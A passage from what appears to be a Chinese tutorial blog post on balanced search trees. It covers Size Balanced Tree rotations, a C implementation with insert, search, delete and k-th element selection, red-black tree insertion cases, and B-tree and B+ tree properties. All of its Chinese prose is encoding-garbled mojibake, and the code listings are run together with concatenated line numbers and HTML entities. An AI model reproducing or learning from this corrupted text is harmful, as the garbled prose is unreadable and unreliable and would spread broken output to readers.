é™¤ä¸€ä¸ªå…ƒç´ åä¸æ–­å›æº¯çš„è¿‡ç¨‹ä¸­ï¼Œå¦‚æœå‡ºç°ç»“ç‚¹ä¸å¹³è¡¡ï¼Œåˆ™å’Œæ’å…¥æ“ä½œé‡‡ç”¨ç›¸åŒçš„è°ƒæ•´æ“ä½œï¼Œç¡®ä¿åœ¨åˆ é™¤ä»¥åæ•´æ£µæ ‘ä¾ç„¶æ˜¯å¹³è¡¡çš„ã€‚ Size Balanced Tree å¯¹äº SBTï¼Œå®ƒçš„è‡ªå¹³è¡¡æ¡ä»¶ä¼šæ˜¾å¾—ç¨å¾®å¤æ‚ä¸€äº›ï¼šå¯¹äºæ¯ä¸ªç»“ç‚¹ tï¼ŒåŒæ—¶æ»¡è¶³ï¼š $$ size[right[t]]â‰¥max(size[left[left[t]]],size[right[left[t]]]) \\ size[left[t]]â‰¥max(size[left[right[t]]],size[right[right[t]]]) $$ sizeè¡¨ç¤ºä»¥è¯¥èŠ‚ç‚¹ä¸ºæ ¹çš„å­æ ‘ä¸­èŠ‚ç‚¹ä¸ªæ•°ã€‚ æ¯ä¸ªç»“ç‚¹æ‰€åœ¨å­æ ‘çš„ç»“ç‚¹ä¸ªæ•°ï¼Œä¸å°äºå…¶å…„å¼Ÿçš„ä¸¤ä¸ªå­©å­æ‰€åœ¨å­æ ‘çš„ç»“ç‚¹ä¸ªæ•°çš„æœ€å¤§å€¼ã€‚ æ—‹è½¬æ“ä½œå’Œ AVL æ ‘çš„å·¦æ—‹å³æ—‹æ˜¯å®Œå…¨ä¸€æ ·çš„ã€‚ åªæ˜¯æ—‹è½¬çš„è§¦å‘æ¡ä»¶ä¸åŒã€‚ æ—‹è½¬çš„è§¦å‘ åœ¨è°ƒæ•´è¿‡ç¨‹ä¸­ï¼Œä¸€å…±æœ‰ 4 ç§ä¼šè§¦å‘æ—‹è½¬çš„æƒ…å†µï¼š LL å‹ï¼ˆ size[left[left[t]]] &gt; size[right[t]] ï¼‰ï¼šé¦–å…ˆå¯¹å­æ ‘ t æ‰§è¡Œå³æ—‹æ“ä½œï¼Œæ—‹è½¬ä»¥åå¯¹ t çš„å³å­æ ‘è¿›è¡Œè°ƒæ•´ï¼Œä¹‹åå†å¯¹å­æ ‘ t è¿›è¡Œè°ƒæ•´ã€‚ LR å‹ï¼ˆ size[right[left[t]]] &gt; size[right[t]] ï¼‰ï¼šé¦–å…ˆå¯¹ t çš„å·¦å­æ ‘æ‰§è¡Œå·¦æ—‹æ“ä½œï¼Œå†å¯¹ t è¿›è¡Œå³æ—‹æ“ä½œã€‚ä¹‹ååˆ†åˆ«è°ƒæ•´ç»“ç‚¹ t çš„å·¦å³å­æ ‘ï¼Œæœ€ç»ˆå¯¹ç»“ç‚¹ tè¿›è¡Œè°ƒæ•´ã€‚ RR å‹ï¼ˆ size[right[right[t]]] &gt; size[left[t]] ï¼‰ï¼šé¦–å…ˆå¯¹ t æ‰§è¡Œå·¦æ—‹æ“ä½œï¼Œæ—‹è½¬ä»¥åå¯¹ t çš„å·¦å­æ ‘è¿›è¡Œè°ƒæ•´ï¼Œä¹‹åå†å¯¹ t è¿›è¡Œè°ƒæ•´ã€‚ RL å‹ï¼ˆ size[left[right[t]]] &gt; size[left[t]] ï¼‰ï¼šé¦–å…ˆå¯¹ç»“ç‚¹ t çš„å³å­æ ‘æ‰§è¡Œå³æ—‹æ“ä½œï¼Œå†å¯¹ t è¿›è¡Œå·¦æ—‹æ“ä½œã€‚ä¹‹ååˆ†åˆ«è°ƒæ•´ t çš„å·¦å³å­æ ‘ï¼Œæœ€ç»ˆå¯¹ t è¿›è¡Œè°ƒæ•´ã€‚ é€šè¿‡é€’å½’çš„è¿›è¡Œè°ƒæ•´ï¼Œè®©ä¸å¹³è¡¡çš„ SBTree æ¢å¤å¹³è¡¡çŠ¶æ€ã€‚ ç®€åŒ–æµç¨‹ï¼š å¦‚æœåœ¨å¤„ç†å·¦å­æ ‘æ›´é«˜çš„æƒ…å†µï¼š LL å‹ï¼šå³æ—‹ tã€‚ LR å‹ï¼šå·¦æ—‹ t çš„å·¦å­æ ‘ï¼Œå†å³æ—‹ tã€‚ å¦‚æœåœ¨å¤„ç†å³å­æ ‘æ›´é«˜çš„æƒ…å†µï¼š RR å‹ï¼šå·¦æ—‹ tã€‚ RL å‹ï¼šå³æ—‹ t çš„å³å­æ ‘ï¼Œå†å·¦æ—‹ tã€‚ é€’å½’è°ƒæ•´å·¦å­æ ‘ä¸­å·¦å­æ ‘çš„å·¦å­æ ‘æ›´é«˜çš„æƒ…å†µã€‚ é€’å½’è°ƒæ•´å³å­æ ‘ä¸­å³å­æ ‘çš„å³å­æ ‘æ›´é«˜çš„æƒ…å†µã€‚ é€’å½’è°ƒæ•´å½“å‰å­æ ‘ä¸­å·¦å­æ ‘æ›´é«˜çš„æƒ…å†µã€‚ é€’å½’è°ƒæ•´å½“å‰å­æ ‘ä¸­å³å­æ ‘æ›´é«˜çš„æƒ…å†µã€‚ å’Œ AVL ä¸å¤ªä¸€æ ·çš„æ˜¯ï¼ŒSBTree åªæœ‰åœ¨æ’å…¥æ—¶æ‰å¯èƒ½è§¦å‘è°ƒæ•´ï¼Œè€Œä¸éœ€è¦åœ¨åˆ é™¤ç»“ç‚¹ä»¥åè¿›è¡Œè°ƒæ•´ ã€‚ ä»ç†è®ºä¸Šè¯´ï¼ŒSBTree å’Œ AVL æ ‘ç›¸æ¯”åœ¨å‡æ‘Šæ—¶é—´å¤æ‚åº¦ä¸Šæ²¡æœ‰åŒºåˆ«ï¼Œæ¯æ¬¡æŸ¥è¯¢ã€æ’å…¥å’Œåˆ é™¤çš„æ—¶é—´å¤æ‚åº¦éƒ½ä¸º \\(O(\\log(n))\\)ã€‚ åœ¨å®é™…è¿ç”¨ä¸­ï¼ŒSBTree åœ¨æŸ¥è¯¢æ“ä½œè¾ƒå¤šçš„æƒ…å†µä¸‹ä¼šæœ‰æ•ˆç‡ä¸Šçš„ä¼˜åŠ¿ã€‚åŠ ä¹‹ä¸ºäº†ç»´æŠ¤å¹³è¡¡æ€§è®°å½•äº†æ¯ä¸ªç»“ç‚¹æ‰€åœ¨å­æ ‘å¤§å°ï¼ˆå³å­æ ‘å†…ç»“ç‚¹ä¸ªæ•°ï¼‰ï¼Œç›¸æ¯”å…¶ä»–å¹³è¡¡äºŒå‰æŸ¥æ‰¾æ ‘è€Œè¨€ï¼Œæ›´ä¾¿äºæ±‚è§£ç¬¬ k å¤§å…ƒç´ ã€æˆ–æ±‚è§£å…ƒç´ çš„ç§©ï¼ˆrankï¼‰ç­‰ç±»ä¼¼é—®é¢˜ã€‚ å®ç° 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define ERROR 0#define OK 1typedef struct SBTNode &#123; int data, size; struct SBTNode *lchild, *rchild, *father;&#125;SBTNode;SBTNode* init(int init_data, int init_size, SBTNode *init_father);SBTNode *NIL;void init_NIL() &#123; NIL = (SBTNode *)malloc(sizeof(SBTNode)); NIL-&gt;data = 0; NIL-&gt;size = 0; NIL-&gt;lchild = NIL; NIL-&gt;rchild = NIL; NIL-&gt;father = NULL;&#125;SBTNode* init(int init_data, int init_size, SBTNode *init_father) &#123; SBTNode *node = (SBTNode *)malloc(sizeof(SBTNode)); node-&gt;data = init_data; node-&gt;size = init_size; node-&gt;lchild = NIL; node-&gt;rchild = NIL; node-&gt;father = init_father; return node;&#125;// å·¦æ—‹å®ç°ï¼Œå¤æ‚ä¸€ç‚¹çš„é“¾è¡¨æŒ‡å‘å…³ç³»è½¬ç§»SBTNode* left_rotate(SBTNode *node) &#123; SBTNode *temp = node-&gt;rchild; node-&gt;rchild = temp-&gt;lchild; temp-&gt;lchild-&gt;father = node; temp-&gt;lchild = node; temp-&gt;father = node-&gt;father; node-&gt;father = temp; temp-&gt;size = node-&gt;size; node-&gt;size = node-&gt;lchild-&gt;size + node-&gt;rchild-&gt;size + 1; return temp;&#125;// å³æ—‹å®ç°ï¼Œæ—‹è½¬æ“ä½œçš„æ ¹èŠ‚ç‚¹ä¸ºnodeSBTNode* right_rotate(SBTNode *node) &#123; SBTNode *temp = node-&gt;lchild; node-&gt;lchild = temp-&gt;rchild; temp-&gt;rchild-&gt;father = node; temp-&gt;rchild = node; temp-&gt;father = node-&gt;father; node-&gt;father = temp; temp-&gt;size = node-&gt;size; node-&gt;size = node-&gt;lchild-&gt;size + node-&gt;rchild-&gt;size + 1; return temp;&#125;// é€’å½’è°ƒæ•´å¹³è¡¡äºŒå‰æ ‘ï¼Œä»¥sizeä¸ºå¯¹æ¯”æ ‡å‡†ï¼ŒflagæŒ‡ç¤ºå­æ ‘å“ªä¸€è¾¹sizeæ›´å¤§SBTNode* maintain(SBTNode *node, int flag) &#123; if (flag == 0) &#123; // å·¦å­æ ‘ä¸­å·¦å­æ ‘size å¤§äº nodeçš„å³å­æ ‘ï¼ŒLLæƒ…å†µï¼Œä½¿ç”¨å³æ—‹è°ƒæ•´ if (node-&gt;lchild-&gt;lchild-&gt;size &gt; node-&gt;rchild-&gt;size) &#123; node = right_rotate(node); &#125; // LR, å…ˆå·¦æ—‹å†å³æ—‹ else if (node-&gt;lchild-&gt;rchild-&gt;size &gt; node-&gt;rchild-&gt;size) &#123; node-&gt;lchild = left_rotate(node-&gt;lchild); node = right_rotate(node); &#125; else &#123; return node; &#125; &#125; else &#123; // RR, å·¦æ—‹ if (node-&gt;rchild-&gt;rchild-&gt;size &gt; node-&gt;lchild-&gt;size) &#123; node = left_rotate(node); &#125; // RLï¼Œå…ˆå³æ—‹å†å·¦æ—‹ else if (node-&gt;rchild-&gt;lchild-&gt;size &gt; node-&gt;lchild-&gt;size) &#123; node-&gt;rchild = right_rotate(node-&gt;rchild); node = left_rotate(node); &#125; else &#123; return node; &#125; &#125; // é€’å½’å¤„ç†å·¦å³å­æ ‘ node-&gt;lchild = maintain(node-&gt;lchild, 0); node-&gt;rchild = maintain(node-&gt;rchild, 1); // å½“å­æ ‘è°ƒæ•´åï¼Œå†å¤„ç† node çš„å¹³è¡¡ node = maintain(node, 0); node = maintain(node, 1); return node;&#125;SBTNode* insert(SBTNode *node, int value) &#123; node-&gt;size++; if (value &gt; node-&gt;data) &#123; if (node-&gt;rchild == NIL) &#123; node-&gt;rchild = init(value, 1, node); &#125; else &#123; node-&gt;rchild = insert(node-&gt;rchild, value); &#125; &#125; else &#123; if (node-&gt;lchild == NIL) &#123; node-&gt;lchild = init(value, 1, node); &#125; else &#123; node-&gt;lchild = insert(node-&gt;lchild, value); &#125; &#125; return maintain(node, value &gt; node-&gt;data);&#125;SBTNode* search(SBTNode *node, int value) &#123; if (node == NIL || node-&gt;data == value) &#123; return node; &#125; else if (value &gt; node-&gt;data) &#123; if (node-&gt;rchild == NIL) &#123; return NIL; &#125; else &#123; return search(node-&gt;rchild, value); &#125; &#125; else &#123; if (node-&gt;lchild == NIL) &#123; return NIL; &#125; else &#123; return search(node-&gt;lchild, value); &#125; &#125;&#125;SBTNode* insert_node(SBTNode *node, int value) &#123; if (node == NULL) &#123; node = init(value, 1, NULL); return node; &#125; if (search(node, value) != NIL) &#123; return node; &#125; return insert(node, value);&#125;SBTNode* predecessor(SBTNode *node) &#123; SBTNode *temp = node-&gt;lchild; while (temp != NIL &amp;&amp; temp-&gt;rchild != NIL) &#123; temp = temp-&gt;rchild; &#125; return temp;&#125;SBTNode* successor(SBTNode *node) &#123; SBTNode *temp = node-&gt;rchild; while (temp != NIL &amp;&amp; temp-&gt;lchild != NIL) &#123; temp = temp-&gt;lchild; &#125; return temp;&#125;void remove_node(SBTNode *delete_node) &#123; SBTNode *temp = NIL; if (delete_node-&gt;lchild != NIL) &#123; temp = delete_node-&gt;lchild; temp-&gt;father = delete_node-&gt;father; delete_node-&gt;lchild = NIL; &#125; if (delete_node-&gt;rchild != NIL) &#123; temp = delete_node-&gt;rchild; temp-&gt;father = delete_node-&gt;father; delete_node-&gt;rchild = NIL; &#125; if (delete_node-&gt;father-&gt;lchild == delete_node) &#123; delete_node-&gt;father-&gt;lchild = temp; &#125; else &#123; delete_node-&gt;father-&gt;rchild = temp; &#125; temp = delete_node; while (temp != NULL) &#123; temp-&gt;size--; temp = temp-&gt;father; &#125; delete_node-&gt;lchild = NIL; delete_node-&gt;rchild = NIL; free(delete_node);&#125;int delete_tree(SBTNode *node, int value) &#123; SBTNode *delete_node, *current_node; current_node = search(node, value); if (current_node == NIL) &#123; return ERROR; &#125; if (current_node-&gt;lchild != NIL) &#123; delete_node = predecessor(current_node); &#125; else if (current_node-&gt;rchild != NIL) &#123; delete_node = successor(current_node); &#125; else &#123; delete_node = current_node; &#125; current_node-&gt;data = delete_node-&gt;data; remove_node(delete_node); return OK;&#125;void inorder(SBTNode *node) &#123; if (node == NIL) return; inorder(node-&gt;lchild); printf(\"%d \", node-&gt;data); inorder(node-&gt;rchild); return;&#125;void clear(SBTNode *node) &#123; if (node != NIL) &#123; if (node-&gt;lchild != NIL) &#123; clear(node-&gt;lchild); &#125; if (node-&gt;rchild != NIL) &#123; clear(node-&gt;rchild); &#125; free(node); &#125;&#125;int main() &#123; init_NIL(); SBTNode *binarytree = NULL; int arr[10] = &#123; 8, 9, 10, 3, 2, 1, 6, 4, 7, 5 &#125;; for (int i = 0; i &lt; 10; i++) &#123; binarytree = insert_node(binarytree, arr[i]); &#125; int value; scanf(\"%d\", &amp;value); if (search(binarytree, value) != NIL) &#123; printf(\"search success!\\n\"); &#125; else &#123; printf(\"search failed!\\n\"); &#125; scanf(\"%d\", &amp;value); if (delete_tree(binarytree, value)) &#123; printf(\"delete success!\\n\"); &#125; else &#123; printf(\"delete failed!\\n\"); &#125; clear(binarytree); return 0;&#125; æ±‚è§£ç¬¬kå°å…ƒç´  åªéœ€è¦åœ¨SBTreeåŸºç¡€ä¸Šï¼Œå¢åŠ ä¸€ä¸ªå‡½æ•° select_aã€‚SBTreeè®°å½•äº†æ ‘çš„sizeï¼Œæ‰€ä»¥æ‰¾åˆ°æŸä¸ªå¤§å°çš„å…ƒç´ æ¯”è¾ƒä¾¿åˆ©ã€‚ 12345678910111213141516171819202122232425...int select_a(SBTNode *node, int k) &#123; int rank = node-&gt;lchild-&gt;size + 1; if (rank == k) &#123; return node-&gt;data; &#125; else if (k &lt; rank) &#123; return select_a(node-&gt;lchild, k); &#125; else &#123; return select_a(node-&gt;rchild, k - rank); &#125;&#125;int main() &#123; init_NIL(); SBTNode *binarytree = NULL; int arr[10] = &#123; 8, 9, 10, 3, 2, 1, 6, 4, 7, 5 &#125;; for (int i = 0; i &lt; 10; i++) &#123; binarytree = insert_node(binarytree, arr[i]); &#125; int k; scanf(\"%d\", &amp;k); printf(\"%d\\n\", select_a(binarytree, k)); clear(binarytree); return 0;&#125; RBTree çº¢é»‘æ ‘ï¼ˆRed-Black Treeï¼‰ ä¹Ÿæ˜¯ä¸€ç§è‡ªå¹³è¡¡çš„äºŒå‰æŸ¥æ‰¾æ ‘ã€‚1972 å¹´ç”± Rudolf Bayer å‘æ˜çš„ï¼Œè€Œâ€œçº¢é»‘æ ‘â€çš„åå­—æ˜¯ç”± Leo J. Guibas å’Œ Robert Sedgewick ï¼ˆå†™ ã€Šç®—æ³•ã€‹çš„æ™®æ—æ–¯é¡¿å¤§ä½¬ï¼‰äº 1978 å¹´é¦–æ¬¡æå‡ºã€‚ çº¢é»‘æ ‘ç›¸æ¯”äº AVLï¼Œç‰ºç‰²äº†éƒ¨åˆ†å¹³è¡¡æ€§ä»¥åœ¨æ’å…¥ã€åˆ é™¤æ“ä½œæ—¶å‡å°‘æ—‹è½¬æ“ä½œï¼Œæ•´ä½“æ€§èƒ½ä¼˜äº AVLï¼Œä¹Ÿæ­£å› å¦‚æ­¤ï¼ŒC++ STL ä¸­çš„ map å°±æ˜¯ç”¨çº¢é»‘æ ‘å®ç°çš„ã€‚ çº¢é»‘æ ‘å’Œå…¶ä»–å¹³è¡¡äºŒå‰æŸ¥æ‰¾æ ‘ç›¸æ¯”ï¼Œå¢åŠ äº†ä¸€ä¸ª é¢œè‰² å±æ€§ï¼Œç”¨æ¥æ ‡è¯†æ ‘ä¸Šçš„ç»“ç‚¹æ˜¯çº¢è‰²è¿˜æ˜¯é»‘è‰²ï¼›å¹¶ä¸”å¦‚æœä¸€ä¸ªç»“ç‚¹æ²¡æœ‰å­ç»“ç‚¹ï¼Œåˆ™è¯¥ç»“ç‚¹çš„å­èŠ‚ç‚¹å¯¹åº”çš„æŒ‡é’ˆä¸º NILï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œçº¢é»‘æ ‘çš„æ‰€æœ‰å¶å­éƒ½æ˜¯ NILã€‚ çº¢é»‘æ ‘æ˜¯æ»¡è¶³å¦‚ä¸‹æ¡ä»¶çš„äºŒå‰æŸ¥æ‰¾æ ‘ï¼š æ¯ä¸ªç»“ç‚¹è¦ä¹ˆæ˜¯çº¢è‰²ï¼Œè¦ä¹ˆæ˜¯é»‘è‰²ï¼› æ ¹ç»“ç‚¹æ˜¯é»‘è‰²ï¼› å¶ç»“ç‚¹ï¼ˆNILï¼‰æ˜¯é»‘è‰²ï¼› å¦‚æœä¸€ä¸ªç»“ç‚¹æ˜¯çº¢è‰²ï¼Œåˆ™å®ƒçš„ä¸¤ä¸ªå­èŠ‚ç‚¹éƒ½æ˜¯é»‘è‰²çš„ï¼› ä»æ ¹ç»“ç‚¹å‡ºå‘åˆ°æ‰€æœ‰å¶ç»“ç‚¹çš„è·¯å¾„ä¸Šï¼Œå‡åŒ…å«ç›¸åŒæ•°ç›®çš„é»‘è‰²ç»“ç‚¹ã€‚ ç¬¬äº”æ¡è§„åˆ™æ˜¯çº¢é»‘æ ‘å¹³è¡¡æ€§çš„æ ¸å¿ƒã€‚ å› ä¸ºç¬¬å››æ¡å’Œç¬¬äº”æ¡è§„åˆ™çš„é™åˆ¶ï¼Œä½¿å¾—çº¢é»‘æ ‘ä¸Šä»æ ¹ç»“ç‚¹åˆ°æ¯ä¸ªå¶ç»“ç‚¹çš„æœ€é•¿è·¯å¾„æœ€å¤šæ˜¯æœ€çŸ­è·¯å¾„çš„ä¸¤å€ï¼Œè¿™ä¹Ÿç¡®ä¿äº†æ•´æ£µäºŒå‰æŸ¥æ‰¾æ ‘æ˜¯å¹³è¡¡çš„ã€‚ çº¢é»‘æ ‘æ’å…¥ æ’å…¥åˆ†ä¸ºå››ç§æƒ…å†µï¼Œä¸”æ’å…¥èŠ‚ç‚¹é»˜è®¤ä¸ºçº¢è‰²ï¼š æ–°ç»“ç‚¹ x ä½äºæ ‘çš„æ ¹ æ ¹æ®ç¬¬äºŒæ¡è§„åˆ™ï¼Œå°†æ–°ç»“ç‚¹çš„é¢œè‰²æ”¹ä¸ºé»‘è‰²ã€‚ x çš„å”çˆ¶ç»“ç‚¹ï¼ˆçˆ¶èŠ‚ç‚¹çš„å…„å¼Ÿï¼‰æ˜¯çº¢è‰² æ­¤æ—¶ x çš„ç¥–çˆ¶ç»“ç‚¹ä¸€å®šæ˜¯é»‘è‰²çš„ã€‚ å°†ç¥–çˆ¶ç»“ç‚¹çš„é»‘è‰²æ”¹ä¸ºçº¢è‰²ï¼Œå¹¶å°† x çš„çˆ¶ç»“ç‚¹å’Œå”çˆ¶ç»“ç‚¹æ”¹ä¸ºé»‘è‰²ã€‚ä¹‹åå°† x çš„ç¥–çˆ¶ç»“ç‚¹ä½œä¸º x ç»§ç»­å‘ä¸Šè¿­ä»£ï¼ˆç›´åˆ°æ ¹èŠ‚ç‚¹ï¼‰ã€‚ x çš„å”çˆ¶ç»“ç‚¹æ˜¯é»‘è‰²çš„ï¼Œå¹¶ä¸” x æ˜¯ä¸€ä¸ªå³å­©å­ å¯¹ x çš„çˆ¶ç»“ç‚¹è¿›è¡Œå·¦æ—‹ï¼ŒåŸçˆ¶ç»“ç‚¹ä»ä¸ºçº¢è‰²ï¼Œå”çˆ¶ç»“ç‚¹ä»ä¸ºé»‘è‰²ã€‚è¿›è¡Œç¬¬å››ç§æƒ…å†µæ“ä½œï¼Œä¸”åœ¨ç¬¬å››ç§æƒ…å†µä¸­ï¼Œxä»£è¡¨å·¦æ—‹å‰çš„çˆ¶èŠ‚ç‚¹ã€‚ x çš„å”çˆ¶ç»“ç‚¹æ˜¯é»‘è‰²çš„ï¼Œå¹¶ä¸” x æ˜¯ä¸€ä¸ªå·¦å­©å­ å°† x çš„çˆ¶ç»“ç‚¹æ”¹ä¸ºé»‘è‰²ï¼Œç¥–çˆ¶ç»“ç‚¹æ”¹ä¸ºçº¢è‰²ï¼Œå¹¶å¯¹ x çš„ç¥–çˆ¶ç»“ç‚¹è¿›è¡Œå³æ—‹ã€‚ åˆ é™¤æ“ä½œä¸å†™äº†ï¼Œæœ‰ç‚¹éº»çƒ¦ï¼Œä¹Ÿæ²¡é‚£ä¸ªå…´è¶£ä»å¤´å®ç°ï¼Œæ¯”è¾ƒå¤æ‚çš„ç®—æ³•ï¼Œç…§ç€ä¼ªä»£ç å®ç°æŒºè€—æ—¶é—´çš„ã€‚ å¤šè·¯å¹³è¡¡äºŒå‰æ ‘ åœ¨æ•°æ®é‡è¾ƒå¤§çš„å·¥ç¨‹åº”ç”¨ï¼ˆå¦‚æ•°æ®åº“ï¼‰ä¸­ï¼Œç”±äºæ ‘ä¸­çš„ç»“ç‚¹ä¿¡æ¯å¾€å¾€ä¿å­˜åœ¨ç£ç›˜è€Œéå†…å­˜é‡Œï¼Œç»´æŠ¤ä¸€æ£µå¹³è¡¡äºŒå‰æŸ¥æ‰¾æ ‘ä¼šå¯¼è‡´å¤§é‡çš„ç£ç›˜å¯»å€å’Œè¯»å†™æ“ä½œã€‚è€Œç£ç›˜å­˜å–çš„æ—¶é—´è¦æ¯” CPU è¿ç®—çš„æ—¶é—´æ›´é•¿ã€‚ ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå¯ä»¥é€šè¿‡æ¯æ¬¡å­˜å–è¿ç»­å¤šä¸ªæ•°æ®é¡¹ï¼Œæ¥å‡å°‘ç£ç›˜è¯»å†™çš„æ—¶é—´å¼€é”€ã€‚ å¹³è¡¡æ ‘æ˜¯æ£€ç´¢æ•ˆç‡éå¸¸é«˜çš„ä¸€ç±»æ•°æ®ç»“æ„ï¼Œä½†å¹³è¡¡æ ‘æ¯ä¸ªç»“ç‚¹åªèƒ½ä¿å­˜ä¸€ä¸ªå…³é”®å­—ã€‚ä¸ºäº†ä¾¿äºä¸€æ¬¡ä»ç£ç›˜ä¸­è¯»å…¥è¿ç»­çš„å¤šä¸ªæ•°æ®ï¼Œå¤šè·¯æŸ¥æ‰¾æ ‘æ¥äº†ã€‚ å°†äºŒå‰æŸ¥æ‰¾æ”¹ä¸ºå¤šè·¯æŸ¥æ‰¾ï¼Œå¯ä»¥åœ¨é™ä½æŸ¥æ‰¾æ·±åº¦çš„åŒæ—¶ï¼Œåœ¨åŒä¸€ä¸ªç»“ç‚¹å†…ç»´æŠ¤æ›´å¤šçš„ä¿¡æ¯ï¼Œæ¯æ¬¡å­˜å–è¿ç»­å¤šä¸ªæ•°æ®é¡¹ï¼Œé™ä½ç£ç›˜å¯»å€å’Œè¯»å†™çš„æ—¶é—´å¼€é”€ï¼Œä¼˜åŒ–åœ¨ç£ç›˜ä¸Šæ£€ç´¢æ•°æ®çš„æ€§èƒ½ã€‚ å¤šè·¯æŸ¥æ‰¾æ ‘ï¼ˆMulti-way search treeï¼‰ æ˜¯æŒ‡æ ‘ä¸­ç»“ç‚¹æœ€å¤šæœ‰ M ä¸ªå­©å­ã€‚æŸ¥æ‰¾çš„æ—¶é—´æ•ˆç‡ä¾ç„¶å¯ä»¥ä¿è¯ä¸º \\(O(\\log(n))\\) å¤æ‚åº¦ï¼Œå¹¶ä¸”æ ‘çš„æ·±åº¦æ›´å°ã€‚ 2-3æ ‘ åœ¨ 2-3 æ ‘ä¸­ï¼Œæœ‰ä¸¤ç§ç»“ç‚¹ï¼š2-node å’Œ 3-nodeï¼Œè¡¨ç¤ºæ¯ä¸ªç»“ç‚¹æœ‰ 2 ä¸ªè¿˜æ˜¯ 3 ä¸ªå­©å­ã€‚ æ ‘ä¸­çš„ æ‰€æœ‰å¶å­ç»“ç‚¹éƒ½åœ¨åŒä¸€å±‚ ï¼Œå¶å­ç»“ç‚¹å¯ä»¥åŒ…å«ä¸€ä¸ªæˆ–ä¸¤ä¸ªå…³é”®å­—ã€‚ 2-node ä¸€å®š æœ‰ä¸¤ä¸ªå­©å­å’Œä¸€ä¸ªå…³é”®å­—ï¼›3-node ä¸€å®š æœ‰ä¸‰ä¸ªå­©å­å’Œä¸¤ä¸ªå…³é”®å­—ã€‚ 3-nodeæœ‰ä¸‰ä¸ªå­æ ‘ï¼Œä¸¤ä¸ªå…³é”®å­—çš„å€¼åˆ’åˆ†äº†ä¸‰æ®µè¿ç»­çš„åŒºé—´ï¼Œä¸‰ä¸ªå­æ ‘åˆ†åˆ«ä½äºè¿™ä¸‰ä¸ªåŒºé—´å†…ã€‚ Bæ ‘ ä¸€æ£µæœ€å°åº¦æ•°ä¸º t (t &gt;= 2) çš„ B æ ‘é™¤äº†æ»¡è¶³å¤šè·¯æŸ¥æ‰¾æ ‘çš„åŸºæœ¬æ€§è´¨ä»¥å¤–ï¼Œè¿˜æ»¡è¶³å¦‚ä¸‹çš„æ€§è´¨ï¼š æ ¹ç»“ç‚¹è‡³å°‘æœ‰ä¸€ä¸ªå…³é”®å­—ï¼Œä»¥åŠä¸¤ä¸ªå­©å­ç»“ç‚¹ï¼› æ‰€æœ‰å†…éƒ¨ç»“ç‚¹è‡³å°‘æœ‰ t ä¸ªå­©å­ç»“ç‚¹ï¼Œè‡³å¤šæœ‰ 2t ä¸ªå­©å­ç»“ç‚¹ï¼› æ‰€æœ‰å†…éƒ¨ç»“ç‚¹è‡³å°‘æœ‰ tâˆ’1 ä¸ªå…³é”®å­—ï¼Œè‡³å¤šæœ‰ 2tâˆ’1 ä¸ªå…³é”®å­—ï¼› æ¯ä¸ªå¶å­ç»“ç‚¹æ²¡æœ‰å­©å­ã€‚ æŸ¥æ‰¾ 123456789search(node, key) i = 0 while i &lt; node-&gt;count and key &gt; node-&gt;keys[i] i = i + 1 if i &lt; node-&gt;count and key == node-&gt;keys[i] return (node, i) else if node-&gt;is_leaf return NIL else return search(node-&gt;childs[i], key) æ¯ä¸ªnodeæœ‰countä¸ªå­èŠ‚ç‚¹ã€‚ æ’å…¥ èŠ‚ç‚¹çš„å­èŠ‚ç‚¹ä¸ªæ•°æ˜¯å¯ä»¥å˜åŒ–çš„ï¼Œæ‰€ä»¥å½“è¾¾åˆ°ä¸€ä¸ªèŠ‚ç‚¹çš„æœ€å¤§åº¦æ•°ï¼ˆæˆ–è€…å…³é”®å­—ä¸ªæ•°ï¼‰éœ€è¦å°†å­èŠ‚ç‚¹ä¸­åˆé€‚çš„å…³é”®å­—æå‡åˆ°çˆ¶èŠ‚ç‚¹ä¸­ï¼Œè‹¥çˆ¶èŠ‚ç‚¹ä¹Ÿæ»¡äº†ï¼Œå°±ç»§ç»­æå‡ã€‚åˆ’åˆ†å‡ºæ›´å°çš„èŠ‚ç‚¹ï¼Œå†è¿›è¡Œæ’å…¥ã€‚ åˆ é™¤ B æ ‘çš„åˆ é™¤æ“ä½œéœ€è¦åœ¨é€’å½’è¿‡ç¨‹ä¸­ç¡®ä¿æ‰€åœ¨ç»“ç‚¹çš„å…³é”®å­—ä¸ªæ•° ä¸å°äº æœ€å°åº¦æ•° tã€‚ B+ æ ‘ B+ æ ‘å’Œ B æ ‘çš„ä¸åŒä¹‹å¤„åœ¨äºï¼š æ‰€æœ‰å…³é”®å­—éƒ½å­˜æ”¾åœ¨å¶ç»“ç‚¹ä¸­ï¼Œéå¶ç»“ç‚¹çš„å…³é”®å­—è¡¨ç¤ºçš„æ˜¯å­æ ‘ä¸­æ‰€æœ‰å…³é”®å­—çš„æœ€å°å€¼ï¼Œè¿™è¢«ç§°ä¸º æœ€å°å¤å†™ç  ã€‚ä¹Ÿå¯ä»¥ç»Ÿä¸€å­˜å‚¨å­æ ‘æ‰€æœ‰å…³é”®å­—çš„æœ€å¤§å€¼ã€‚ å¶ç»“ç‚¹åŒ…å«äº†å…¨éƒ¨çš„å…³é”®å­—ä¿¡æ¯ï¼Œå¹¶ä¸”å¶ç»“ç‚¹ä¹‹é—´æŒ‰ä»å°åˆ°å¤§çš„é¡ºåºé“¾æ¥ã€‚ éå¶å­ç»“ç‚¹å†…å¹¶ä¸éœ€è¦çœŸæ­£ä¿å­˜å…³é”®å­—çš„å…·ä½“ä¿¡æ¯ï¼Œå› æ­¤æ•´ä½“çš„ç£ç›˜è¯»å†™å¼€é”€ä¼šæ›´å°ã€‚ éå†å¶å­ç»“ç‚¹å°±å¯ä»¥ä»å°åˆ°å¤§éå†ç›¸é‚»çš„å…ƒç´ ã€‚ å› æ­¤ï¼Œç°æœ‰çš„æ•°æ®åº“ç´¢å¼•å¤§å¤šé‡‡ç”¨ B+ æ ‘ä½œä¸ºç´¢å¼•æ•°æ®ç»“æ„ã€‚ B * æ ‘ åœ¨ B* æ ‘ä¸­ï¼Œå†…éƒ¨ç»“ç‚¹ï¼ˆéæ ¹ã€éå¶å­ï¼‰ä¹Ÿå¢åŠ 